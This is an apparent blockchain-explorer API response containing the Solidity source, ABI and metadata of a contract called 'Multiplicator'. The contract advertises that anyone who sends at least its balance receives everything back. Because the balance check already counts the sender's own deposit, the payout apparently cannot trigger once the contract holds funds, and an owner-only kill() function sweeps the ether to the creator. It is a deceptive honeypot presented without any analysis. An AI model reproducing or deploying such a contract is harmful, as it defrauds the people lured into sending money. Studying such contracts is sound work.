{"status":"1","message":"OK","result":[{"SourceCode":"contract Multiplicator\r\n{\r\n        //Gotta be generous sometimes\r\n        \r\n        address public Owner = msg.sender;\r\n        mapping (address => bool) winner; //keeping track of addresses that have already benefited\r\n        \r\n\r\n\r\n        function multiplicate(address adr) public payable\r\n        {\r\n            \r\n            if(msg.value>=this.balance)\r\n            {\r\n                require(winner[msg.sender] == false);// every address can only benefit once, don't be greedy \r\n                winner[msg.sender] = true; \r\n                adr.transfer(this.balance+msg.value);\r\n            }\r\n        }\r\n        \r\n        function kill() {\r\n            require(msg.sender==Owner);\r\n            selfdestruct(msg.sender);\r\n         }\r\n         \r\n    //If you want to be generous you can just send ether to this contract without calling any function and others will profit by calling multiplicate\r\n    function () payable {}\r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"multiplicate\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Multiplicator","CompilerVersion":"v0.4.19-nightly.2017.11.30+commit.f5a2508e","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://3171634c8b98ddd6a10a9efb7f310c1983c9ba791102e53cc80db48bf81a020a"}]}